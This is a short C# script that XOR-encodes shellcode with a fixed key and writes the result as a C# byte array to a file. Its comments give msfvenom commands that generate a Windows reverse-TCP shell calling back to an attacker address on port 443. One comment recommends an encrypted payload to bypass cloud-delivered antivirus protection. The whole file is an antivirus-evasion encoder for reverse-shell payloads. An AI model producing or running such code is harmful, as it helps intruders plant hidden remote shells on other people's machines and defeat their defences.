using System.Text;


string CurDirectory = Directory.GetCurrentDirectory();
string File_Name = "Xored_Shell.txt";
string Complete_Path = CurDirectory + "/" + File_Name;


//msfvenom -p windows/x64/shell_reverse_tcp -f csharp LHOST=192.168.146.128 LPORT=443
//msfvenom -p windows/x64/encrypted_shell_reverse_tcp -f csharp  LHOST=192.168.146.128 LPORT=443 [Use encrypted to bypass 'Cloud delivered protection']
byte[] buf = new byte[0] { };





String Keys = "Deep in the night, your shadow cast by a streetlight may suddenly overtake you. It is actually a Gengar running past you, pretending to be your shadow.";
int y = -1;
for (int i = 0; i < buf.Length; i++)
{
    y++;
    if (y >= Keys.Length) { y = 0; }
    buf[i] = (byte)(buf[i] ^ Keys[y]);
}

var sb = new StringBuilder("new byte[] { ");
foreach (var b in buf)
{
    sb.Append("0x" + b.ToString("x") + ",");
}
sb.Remove(sb.Length-1,1);
sb.Append("}");
Console.WriteLine(sb.ToString());
await File.WriteAllTextAsync(Complete_Path, sb.ToString());
